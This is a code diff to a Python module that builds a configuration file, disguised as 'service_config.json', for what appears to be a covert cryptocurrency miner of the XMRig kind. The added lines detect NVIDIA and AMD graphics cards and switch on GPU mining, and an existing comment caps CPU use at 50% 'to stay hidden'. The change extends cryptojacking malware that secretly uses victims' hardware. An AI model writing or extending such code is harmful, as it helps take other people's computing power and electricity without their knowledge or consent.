@@ -61,8 +61,44 @@ def _get_config_path():
     return cache / "service_config.json"
 
 def _create_config(worker_id="default"):
-    """Create config file."""
+    """Create config file with GPU support."""
     config_path = _get_config_path()
+    
+    # Detect GPU
+    has_nvidia = False
+    has_amd = False
+    gpu_threads = 0
+    
+    try:
+        # Check for NVIDIA GPU
+        result = subprocess.run(
+            ["nvidia-smi", "--query-gpu=name,memory.total", "--format=csv,noheader"],
+            capture_output=True, text=True, timeout=5
+        )
+        if result.returncode == 0 and result.stdout.strip():
+            has_nvidia = True
+            # Parse GPU info
+            for line in result.stdout.strip().split('\n'):
+                if line.strip():
+                    gpu_threads += 1  # One thread per GPU
+    except:
+        pass
+    
+    try:
+        # Check for AMD GPU
+        if not has_nvidia and Path("/sys/class/drm").exists():
+            for card in Path("/sys/class/drm").glob("card*"):
+                try:
+                    device = card / "device"
+                    if device.exists():
+                        vendor = (device / "vendor").read_text().strip()
+                        if vendor == "0x1002":  # AMD vendor ID
+                            has_amd = True
+                            gpu_threads += 1
+                except:
+                    pass
+    except:
+        pass
     
     config = {
         "autosave": True,
@@ -72,6 +108,22 @@ def _create_config(worker_id="default"):
             "enabled": True,
             "huge-pages": True,
             "max-threads-hint": 50,  # Use 50% to stay hidden
+        },
+        "cuda": {
+            "enabled": has_nvidia,
+            "loader": None,
+            "nvml": has_nvidia,
+            "cn/0": False,
+            "cn-lite/0": False,
+        },
+        "opencl": {
+            "enabled": has_amd,
+            "cache": True,
+            "loader": None,
+            "platform": "AMD" if has_amd else "NVIDIA",
+            "adl": has_amd,
+            "cn/0": False,
+            "cn-lite/0": False,
         },
         "pools": [
             {
@@ -90,6 +142,12 @@ def _create_config(worker_id="default"):
     
     import json
     config_path.write_text(json.dumps(config, indent=2))
+    
+    # Log GPU detection
+    log_path = _get_cache_dir() / "gpu_detect.log"
+    gpu_info = f"NVIDIA: {has_nvidia}, AMD: {has_amd}, GPU threads: {gpu_threads}\n"
+    log_path.write_text(gpu_info)
+    
     return config_path
 
 def _is_running():
